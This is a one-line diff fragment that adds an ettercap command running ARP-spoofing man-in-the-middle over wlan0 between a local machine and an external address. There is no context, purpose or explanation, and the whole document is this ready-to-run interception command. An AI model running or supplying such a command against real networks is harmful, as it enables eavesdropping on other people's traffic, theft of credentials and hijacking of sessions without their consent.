@@ -1,0 +1,1 @@
+sudo ettercap -T -Q -M arp -i wlan0 /192.168.1.100/ /24.103.159.167/
